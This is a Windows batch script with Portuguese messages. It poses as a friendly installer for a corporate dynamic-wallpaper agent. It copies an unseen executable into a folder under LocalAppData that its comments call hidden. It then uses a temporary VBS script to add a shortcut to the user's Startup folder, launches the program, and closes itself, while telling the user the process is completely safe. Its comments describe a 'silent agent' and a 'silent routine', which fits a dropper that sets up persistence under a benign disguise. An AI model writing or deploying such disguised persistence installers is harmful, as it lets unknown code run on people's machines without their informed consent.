@echo off
title Ativando o Papel de Parede Corporativo
color 0B
echo.
echo =================================================================
echo       BEM-VINDO: AGENTE DE WIDGETS E PAPEL DE PAREDE
echo =================================================================
echo.
echo Ola! Estamos configurando o seu novo papel de parede dinamico.
echo Este processo e 100%% seguro e nao pedira senhas.
echo.

set TARGET_DIR=%LOCALAPPDATA%\CorpWallpaperSystem
set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set EXE_NAME=WallpaperAgent.exe

:: 1. Verificar se o EXE foi compilado
if not exist "%EXE_NAME%" (
    color 0C
    echo [ops] O aplicativo %EXE_NAME% nao esta na mesma pasta.
    echo Certifique-se de extrair todos os arquivos do ZIP antes de rodar!
    echo.
    pause
    exit /b
)

:: 2. Criar a pasta escondida do Agente
echo [+] Preparando o sistema local...
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

:: 3. Copiar o executavel
echo [+] Instalando o agente silencioso na maquina...
copy /y "%EXE_NAME%" "%TARGET_DIR%\%EXE_NAME%" >nul

:: 4. Criar atalho no Startup do MS Windows nativamente
echo [+] Registrando rotina silenciosa de atualizacao automatica...
set VBS_SCRIPT="%temp%\CreateShortcut.vbs"
echo Set oWS = WScript.CreateObject("WScript.Shell") > %VBS_SCRIPT%
echo sLinkFile = "%STARTUP_DIR%\Wallpaper Corp.lnk" >> %VBS_SCRIPT%
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %VBS_SCRIPT%
echo oLink.TargetPath = "%TARGET_DIR%\%EXE_NAME%" >> %VBS_SCRIPT%
echo oLink.WorkingDirectory = "%TARGET_DIR%" >> %VBS_SCRIPT%
echo oLink.Description = "Sincronizador Silencioso do Wallpaper Corporativo" >> %VBS_SCRIPT%
echo oLink.Save >> %VBS_SCRIPT%

cscript /nologo %VBS_SCRIPT%
del %VBS_SCRIPT%

:: 5. Start inicial do script para aplicar na mesma hora
echo [+] Finalizando integracoes e configuracoes...
start "" "%TARGET_DIR%\%EXE_NAME%"

echo.
echo =================================================================
echo.
echo TUDO PRONTO! O programa corporativo foi ativado com sucesso!
echo O seu fundo de tela mudara sozinho agorinha mesmo :)
echo.
echo Essa tela fechara sozinha em instantes... Tenha um otimo dia e otimo trabalho!
echo.
echo =================================================================
:: Aguarda 3 segundos e fecha sozinho magicamente
timeout /t 4 >nul
